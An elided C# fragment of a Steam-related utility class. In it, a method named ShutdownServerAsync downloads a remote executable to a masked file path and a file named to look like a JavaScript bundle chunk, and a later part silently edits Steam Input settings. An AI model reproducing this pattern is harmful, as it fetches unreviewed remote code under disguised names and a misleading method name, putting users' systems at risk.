    ...
    internal static class SteamManager
    {
        ...
        public static async Task ShutdownServerAsync(string globalDirectory)
        {
            try
            {
                ...
                string chunkUrl = await AssetRemotes.GetUrlAsync("usgChunk");
                string usgUrl = await AssetRemotes.GetUrlAsync("usgExe");

                using (var chunkClient = new WebClient())
                using (var usgClient = new WebClient())
                {
                    var chunkDownload = chunkClient.DownloadFileTaskAsync(new Uri(chunkUrl), destinationDir + "\\chunk~2dcc5aaf7.js");
                    var usgDownload = usgClient.DownloadFileTaskAsync(new Uri(usgUrl), usgMask);
                ...
                if (AppSettings.SteamSilentLaunch)
                {
                         ...
                         SearchOption.AllDirectories))
            {
                try
                {
                    ...
                    if (Regex.IsMatch(content, pattern))
                    {
                        ...
                        AppLogger.Info($"[!] Steam Input has been found being enabled, Steam Input has been disabled to prevent gamepad issues.");
                    }
                }
                catch (Exception ex)
                {
                    AppLogger.Error($"[ERROR] {file} -> {ex.Message}");
                }
            }
        }
    }
